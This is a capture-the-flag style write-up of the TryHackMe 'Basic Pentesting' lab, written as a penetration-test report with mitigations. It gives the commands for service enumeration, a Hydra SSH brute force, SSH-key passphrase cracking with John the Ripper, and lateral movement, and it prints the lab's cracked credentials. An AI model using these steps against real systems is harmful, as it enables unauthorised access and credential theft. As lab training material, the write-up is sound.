
#Cybersecurity Case Study: Internal Network Penetration Testing & Lateral Movement (Lab Assessment)

Room TryHackme: https://tryhackme.com/room/basicpentestingjt
1. Introduction
Project Title: Internal Network Penetration Testing & Lateral Escalation Case Study
Summary / Objective: Perform a security assessment on an internal target host to identify exposed network services, exploit credential weaknesses, execute lateral movement, and retrieve sensitive assets.
Target Information (Anonymized):
Target IP: 10.x.x.x (Anonymized Target Host)
Operating System: Linux (Ubuntu 20.04 LTS)
Domain / Workgroup: WORKGROUP
Tools Used: Nmap, Gobuster, Enum4linux, Hydra, SSH, LinPEAS, John the Ripper (ssh2john.py), SCP.

2. Reconnaissance & Scanning
Detailed documentation of the information gathering phase:
Port & Service Enumeration: Executed Nmap service scan to discover open ports and services.
nmap -sV 10.x.x.x
Highlights: Discovered open ports 22/tcp (SSH - OpenSSH 8.2p1), 80/tcp (HTTP - Apache 2.4.41), 139/445 (Samba smbd 4), 8009 (AJP13), 8080 (Apache Tomcat 9.0.7).
Web Directory Mapping: Utilized Gobuster for directory enumeration.
gobuster dir -u http://10.x.x.x -w /usr/share/wordlists/dirb/common.txt
Highlights: Discovered hidden endpoint /development/ (Status: 301).
SMB Enumeration: Executed Enum4linux to identify SMB domain info and valid usernames.
enum4linux -a 10.x.x.x
Highlights: Successfully enumerated RID range and identified local user accounts: jan, kay, and ubuntu.

3. Exploitation
Vulnerability Identified: Weak user credentials on SSH service (User jan).
Exploit Chosen: Automated dictionary brute-force attack via Hydra targeting SSH.
Execution Steps:
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.x.x.x
Proof of Concept (PoC):
Cracked SSH credential: jan : armando.
Successfully logged in via SSH:
ssh jan@10.x.x.x
# Shell obtained: jan@ip-10-x-x-x:~$

4. Post-Exploitation & Lateral Movement / Privilege Escalation
Local Enumeration:
Checked local accounts in /etc/passwd to confirm home directories (/home/kay, /home/jan).
Transferred automated audit script linpeas.sh to /dev/shm via SCP for internal discovery.
Credential Harvesting & Key Cracking:
Discovered readable encrypted SSH RSA private key for user kay at /home/kay/.ssh/id_rsa.
Converted private key to hash format using ssh2john.py:
/usr/share/john/ssh2john.py kay_id_rsa > forjohn.txt
Cracked key passphrase using John the Ripper with rockyou.txt:
john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
Passphrase identified: beeswax.
Lateral Movement & Target Access:
Authenticated as user kay using the cracked SSH key and passphrase:
ssh -i kay_id_rsa kay@10.x.x.x
Retrieved backup credential asset (pass.bak):
cat pass.bak
# Output: heresareallystrongpasswordthatfollowsthepasswordpolicy$$

5. Reporting & Finalization
Executive Summary: The target system exposed multiple network services (HTTP, SMB, SSH). Initial access was gained via weak SSH credentials. Subsequent post-exploitation revealed improperly stored SSH private keys, enabling unauthorized lateral movement to access confidential credential backups.
Impact Assessment: Critical. Attackers could compromise non-privileged accounts, move horizontally across user profiles, and extract sensitive system credentials.
Recommendations & Mitigation:
1. Enforce Strong Password Policies: Disallow common or dictionary passwords for SSH accounts.
2. SSH Key Hardening: Ensure SSH private keys have strict file permissions (600) and are not accessible by other unprivileged users.
3. Principle of Least Privilege: Restrict access to home directories (/home/kay) from other users.
4. Secure Credential Storage: Avoid storing plain-text passwords in backup files (pass.bak).
Lessons Learned: Combining enumeration tools (Nmap, Gobuster, Enum4linux) with offline credential cracking provides a highly effective pathway to full user compromise. Proper access control and credential hygiene are vital for internal network security.
